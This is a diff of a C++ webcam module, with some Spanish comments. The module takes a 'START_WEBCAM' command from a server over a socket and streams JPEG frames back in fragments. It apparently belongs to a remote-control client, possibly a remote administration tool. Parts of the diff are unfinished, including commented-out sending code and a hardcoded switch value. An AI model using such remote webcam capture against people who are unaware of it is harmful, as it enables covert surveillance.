@@ -4,8 +4,9 @@
 
 
 // constructor -> information of recording and socket
-WebcamManager::WebcamManager(const Stream &stream, std::unordered_map<std::string, std::function<void(nlohmann::json &)>> &actionMap)
-        : Sender(stream, actionMap) {
+WebcamManager::WebcamManager(ClientSocket &clientSocket)
+        : Handler(clientSocket) {
+    ActionMap& actionMap = clientSocket.getActionMap();
     actionMap["START_WEBCAM"] = [&](nlohmann::json& json) {
         threadGen.runInNewThread(this, &WebcamManager::startWebcam,json);
     };
@@ -13,6 +14,7 @@ WebcamManager::WebcamManager(const Stream &stream, std::unordered_map<std::strin
 
 void WebcamManager::setConfiguration(nlohmann::json jsonObject) {
     std::string webcamName = jsonObject["selected_device"];
+    channelID = jsonObject["channel_id"];
     webcamID = DeviceEnumerator::getIndexOfWebcamByName(webcamName);
     fragmented = jsonObject["is_fragmented"];
     FPS = jsonObject["fps"];
@@ -24,7 +26,7 @@ void WebcamManager::setConfiguration(nlohmann::json jsonObject) {
 
 // sending all records available in path vector
 void WebcamManager::sendRecord() {
-    if (!fragmented) output.release();
+    /*if (!fragmented) output.release();
     stream.sendSize(static_cast<int>(pathVector.size()));
     for (const auto &file: pathVector) {
         stream.sendFile(file.c_str());
@@ -33,7 +35,7 @@ void WebcamManager::sendRecord() {
     }
     removeTempFiles();
     initialized=false;
-    pathVector.clear();
+    pathVector.clear();*/
 }
 
 // removing video temporary files
@@ -44,28 +46,54 @@ void WebcamManager::removeTempFiles(){
     }
 }
 
-// process of converting a Mat object into regular img encoding to memory
-void WebcamManager::sendFrame(const cv::Mat& frame){
-    // buffer for coding
-    std::vector<uchar> buff;
-    // encoding image into buffer
-    cv::imencode(".jpeg", frame, buff);
-    // sending process
-    std::cout << buff.size() << std::endl;
-    stream.sendSize((int) buff.size());
-    ::send(stream.getSock(), (char *) &buff[0], (int) buff.size(), 0);
+const int FRAGMENT_SIZE = 64 * 1024; // 64 KB
+const uint8_t LAST_FRAGMENT = 0x02;
+const uint8_t NOT_LAST_FRAGMENT = 0x01;
+
+void WebcamManager::sendFrame(const cv::Mat& frame) {
+    // Codificar la imagen en un buffer
+    std::vector<uchar> imageBuff;
+    cv::imencode(".jpeg", frame, imageBuff);
+
+    std::vector<uint8_t> buffer(FRAGMENT_SIZE);
+    size_t bytesRead = 0;
+    size_t totalSize = imageBuff.size();
+    size_t offset = 0;
+
+    // Suponiendo que fileID es definido en otro lugar
+
+    while (totalSize > 0) {
+        // Preparar los bytes de encabezado: 1 byte para el ID de archivo, 1 byte para el código de control
+        buffer[0] = channelID;
+        buffer[1] = NOT_LAST_FRAGMENT;
+
+        // Calcular cuántos bytes leer para este fragmento
+        if (totalSize >= FRAGMENT_SIZE - 2) {
+            bytesRead = FRAGMENT_SIZE - 2;
+        } else {
+            bytesRead = totalSize;
+            buffer[1] = LAST_FRAGMENT;
+        }
+
+        // Copiar los datos en el buffer, comenzando en el desplazamiento 2
+        std::copy(imageBuff.begin() + offset, imageBuff.begin() + offset + bytesRead, buffer.begin() + 2);
+
+        // Enviar el fragmento (Nota: Enviando bytesRead + 2 bytes para incluir los 2 bytes de control)
+        clientSocket.sendBytes(std::vector<uint8_t>(buffer.begin(), buffer.begin() + bytesRead + 2));
+
+        // Actualizar el desplazamiento y el tamaño total restante
+        offset += bytesRead;
+        totalSize -= bytesRead;
+    }
 }
 
 
 // sending video capture dimensions to server
 void WebcamManager::sendDimensions(int width,int height){
-    stream.sendSize(width);
-    stream.sendSize(height);
+    //stream.sendSize(width);
+    //stream.sendSize(height);
 }
 
-void WebcamManager::send() {
-
-}
 
 // starting webcam, sending information to server
 void WebcamManager::startWebcam(nlohmann::json jsonObject) {
@@ -76,13 +104,13 @@ void WebcamManager::startWebcam(nlohmann::json jsonObject) {
     int frameWidth = (int) vid.get(cv::CAP_PROP_FRAME_WIDTH);
     int frameHeight = (int) vid.get(cv::CAP_PROP_FRAME_HEIGHT);
 
-    sendDimensions(frameWidth,frameHeight);
+    //sendDimensions(frameWidth,frameHeight);
 
 
     boolean streamingState = true;
     while (streamingState) {
         vid >> frame;
-        switch (stream.readSize()) { // save record and stop (no break keyword)
+        switch (23) { // save record and stop (no break keyword)
             case -2: {
                 sendRecord();
             }
@@ -132,7 +160,7 @@ void WebcamManager::startWebcam(nlohmann::json jsonObject) {
             }
 
         }
-
+        Sleep(100);
     }
     vid.release(); // release video
 }
